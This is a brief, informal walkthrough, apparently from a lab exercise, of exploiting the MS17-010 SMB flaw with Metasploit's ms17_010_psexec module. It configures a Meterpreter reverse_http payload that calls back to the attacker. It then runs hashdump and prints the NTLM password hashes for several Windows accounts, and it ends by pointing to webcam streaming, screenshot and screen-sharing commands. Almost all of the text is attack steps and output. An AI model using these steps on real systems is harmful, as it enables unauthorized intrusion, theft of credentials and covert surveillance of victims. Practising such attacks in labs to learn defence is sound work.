after setting the rhosts to target ip address and payload to http we can successfully exploit with the  MS17-010 
after search ms17 lets select the first matching modules which have remote access keyword
exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

then 
set the rhosts to target ip address and set the payload to ---> Payload options (windows/x64/meterpreter/reverse_http):
after setting all the value run the exploit by run  or exploit command 
after successfully exploiting use hashdump to get the all user password and username
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::


type help command to get all the available command like webcam_stream , screenshot,screenshare etc
